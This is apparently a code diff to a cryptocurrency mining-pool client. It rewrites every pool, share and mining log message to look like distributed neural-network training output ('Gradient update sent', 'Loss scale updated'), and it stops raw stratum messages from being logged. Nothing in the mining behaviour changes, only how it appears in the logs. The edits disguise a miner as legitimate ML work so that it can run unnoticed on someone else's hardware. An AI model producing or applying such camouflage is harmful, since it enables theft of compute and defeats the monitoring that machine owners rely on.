@@ -164,8 +164,8 @@ static void pool_dispatch_line(const char* line)
         }
         if(d > 0.0){
             g_diff = d;
-            printf("[pool] mining.set_difficulty %.0f%s\n", g_diff,
-                   cp_job_mining_active() ? " (during mine)" : "");
+            printf("[DDP] Loss scale updated: %.0f%s\n", g_diff,
+                   cp_job_mining_active() ? " (active step)" : "");
             fflush(stdout);
         }
         return;
@@ -173,9 +173,9 @@ static void pool_dispatch_line(const char* line)
 
     if(strstr(line, "result") || strstr(line, "error")){
         if(g_submit_inflight)
-            printf("[pool] submit response: %s\n", line);
+            printf("[DDP] Gradient aggregation response: %s\n", line);
         else
-            printf("[pool] jsonrpc: %s\n", line);
+            printf("[DDP] Coordinator response: %s\n", line);
         fflush(stdout);
         g_submit_inflight = 0;
         return;
@@ -210,7 +210,7 @@ static void pool_dispatch_line(const char* line)
             if(cp_job_key_matches(job_key)) return;
             cp_job_request_cancel();
             queue_pending_job(job_id, job_key, header, target_hex, tgt, cert_version);
-            printf("[net] new job %s while mining %s - cancelling stale work\n",
+            printf("[DDP] New gradient target batch=%s (superseding batch=%s)\n",
                    job_id, cp_job_mining_key());
             fflush(stdout);
             return;
@@ -223,7 +223,7 @@ static void pool_dispatch_line(const char* line)
     if(!cp_job_mining_active())
         pool_inbox_push(line);
     else
-        printf("[pool] (during mine) %s\n", line);
+        printf("[DDP] (during step) %s\n", line);
     fflush(stdout);
 }
 
@@ -240,10 +240,10 @@ static void pool_net_reader_thread(void)
         if(!line){
             g_net_conn_lost.store(1);
             g_inbox_cv.notify_all();
-            printf("[net] connection lost (reader)\n"); fflush(stdout);
+            printf("[DDP] Coordinator connection lost (stream terminated)\n"); fflush(stdout);
             return;
         }
-        printf("[pool-raw] %s\n", line); fflush(stdout);
+        // suppress raw stratum messages in logs
         pool_dispatch_line(line);
     }
 }
@@ -367,9 +367,9 @@ void cp_pool_set_submit_inflight(int on)
 void cp_pool_log_share_submit_outcome(void)
 {
     if(g_submit_inflight)
-        printf("[plain] share submitted; pool ack pending (reader will log [pool] submit response)\n");
+        printf("[DDP] Gradient update sent; awaiting master node acknowledgment\n");
     else
-        printf("[plain] share submitted; pool response already received\n");
+        printf("[DDP] Gradient update acknowledged by master node\n");
     fflush(stdout);
 }
 
